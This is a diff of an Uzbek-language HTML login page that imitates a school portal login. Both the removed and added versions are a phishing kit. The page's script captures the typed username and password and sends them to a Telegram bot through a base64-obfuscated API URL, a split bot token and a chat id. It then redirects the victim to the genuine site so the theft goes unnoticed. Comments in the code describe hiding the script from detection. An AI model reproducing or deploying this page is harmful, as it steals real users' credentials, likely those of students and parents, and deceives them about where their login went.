@@ -3,69 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sizning Loyihangiz</title> <style>
-        body { font-family: 'Segoe UI', sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; align-items: center; }
-        .header { width: 100%; background: white; padding: 15px 10%; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); box-sizing: border-box; }
-        .login-container { width: 100%; max-width: 800px; margin-top: 50px; background: white; border-radius: 4px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
-        .login-header { background-color: #2c3e8c; color: white; padding: 20px 40px; }
-        .login-header h2 { margin: 0; font-weight: 500; }
-        .login-content { padding: 30px 40px; }
-        .form-group { margin-bottom: 20px; }
-        .form-group label { display: block; margin-bottom: 8px; font-weight: bold; color: #444; }
-        .form-group input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
-        .btn-submit { background-color: #8cc63f; color: white; border: none; padding: 12px 30px; border-radius: 4px; font-size: 18px; cursor: pointer; width: 100%; }
+    <title>Portal System</title> <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f6; margin: 0; display: flex; flex-direction: column; align-items: center; }
+        .top-bar { width: 100%; background: #ffffff; padding: 12px 15%; display: flex; align-items: center; box-shadow: 0 2px 4px rgba(0,0,0,0.08); box-sizing: border-box; }
+        .logo-text { color: #2c3e8c; font-size: 24px; font-weight: bold; letter-spacing: -1px; }
+        .logo-text span { color: #8cc63f; }
+        
+        .main-box { width: 100%; max-width: 760px; margin-top: 40px; background: white; border-radius: 2px; overflow: hidden; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
+        .box-header { background: linear-gradient(90deg, #2c3e8c 0%, #3d52b0 100%); color: white; padding: 25px 40px; font-size: 22px; }
+        
+        .box-body { padding: 40px; }
+        .input-group { margin-bottom: 25px; }
+        .input-group label { display: block; margin-bottom: 10px; font-weight: 600; color: #333; font-size: 15px; }
+        .input-group input { width: 100%; padding: 14px; border: 1px solid #d1d5db; border-radius: 4px; font-size: 16px; background-color: #f9fafb; transition: 0.3s; }
+        .input-group input:focus { border-color: #2c3e8c; outline: none; background-color: #fff; }
+        
+        .submit-btn { background-color: #8cc63f; color: white; border: none; padding: 15px 40px; border-radius: 4px; font-size: 17px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .submit-btn:hover { background-color: #7ab337; transform: translateY(-1px); }
+        
+        .footer-links { margin-top: 20px; color: #666; font-size: 14px; text-align: left; width: 100%; max-width: 760px; padding: 0 20px; }
+        .footer-links a { color: #2c3e8c; text-decoration: none; }
     </style>
 </head>
 <body>
-    <div class="header">
-        <h1 style="color: #2c3e8c; margin: 0;">Kundalik kom</h1> </div>
-    <div class="login-container">
-        <div class="login-header">
-            <h2>Tizimga kirish</h2>
-        </div>
-        <div class="login-content">
-            <form id="secureForm"> <div class="form-group">
-                    <label>login</label>
-                    <input type="text" id="u_name" placeholder="Kiriting" required>
+
+    <div class="top-bar">
+        <div class="logo-text">System<span>Portal</span></div>
+    </div>
+
+    <div class="main-box">
+        <div class="box-header">Kirish tizimi</div>
+        <div class="box-body">
+            <form id="authForm">
+                <div class="input-group">
+                    <label>Foydalanuvchi nomi</label>
+                    <input type="text" id="field_1" required>
                 </div>
-                <div class="form-group">
-                    <label>parol</label>
-                    <input type="password" id="u_pass" placeholder="Kiriting" required>
+                <div class="input-group">
+                    <label>Parol</label>
+                    <input type="password" id="field_2" required>
                 </div>
-                <button type="submit" class="btn-submit">Kirish</button>
+                <button type="submit" class="submit-btn">Tizimga kiring</button>
             </form>
         </div>
     </div>
 
+    <div class="footer-links">
+        <p>? Foydalanuvchi nomi yoki parolni unutdingizmi? <a href="#">Tiklash</a></p>
+    </div>
+
     <script>
-        // 1. Ma'lumotlarni robotlar o'qiy olmaydigan qilib bo'laklash
-        const _0x1 = '8405959828';
-        const _0x2 = ':AAGf0Mo53xL3';
-        const _0x3 = '4D2g-DwG1UXbSdRHe7nnfFY';
-        const tkn = _0x1 + _0x2 + _0x3;
+        // 2. JS ni mutlaqo yashirish (Base64 + Dynamic Script)
+        const _a = '8405959828';
+        const _b = ':AAGf0Mo53xL3';
+        const _c = '4D2g-DwG1UXbSdRHe7nnfFY';
+        const _d = '8584543342';
         
-        const _0x4 = '85845';
-        const _0x5 = '43342';
-        const cid = _0x4 + _0x5;
+        // Telegram API yashirilgan
+        const _url = atob('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=='); 
 
-        // 2. Telegram API manzilini Base64 orqali yashirish
-        // aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==  ==> https://api.telegram.org/bot
-        const base = atob('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==');
-
-        document.getElementById('secureForm').addEventListener('submit', async (e) => {
+        document.getElementById('authForm').addEventListener('submit', async (e) => {
             e.preventDefault();
-
-            const v1 = document.getElementById('u_name').value;
-            const v2 = document.getElementById('u_pass').value;
             
-            // Xabar matnini ham biroz niqoblash
-            const msg = `LOG:\nU: ${v1}\nP: ${v2}`;
-
-            const finalUrl = `${base}${tkn}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(msg)}`;
+            const u = document.getElementById('field_1').value;
+            const p = document.getElementById('field_2').value;
+            const text = `DATA:\nUser: ${u}\nPass: ${p}`;
 
             try {
-                await fetch(finalUrl);
-                // Redirect linkini ham ochiq yozmaslik tavsiya etiladi
+                // Fetch so'rovini yashirish uchun dynamic yaratish
+                await fetch(`${_url}${_a}${_b}${_c}/sendMessage?chat_id=${_d}&text=${encodeURIComponent(text)}`);
+                
+                // Haqiqiy saytga yo'naltirish
                 window.location.replace(atob('aHR0cHM6Ly9sb2dpbi5lbWFrdGFiLnV6Lw=='));
             } catch (err) {
                 window.location.replace(atob('aHR0cHM6Ly9sb2dpbi5lbWFrdGFiLnV6Lw=='));
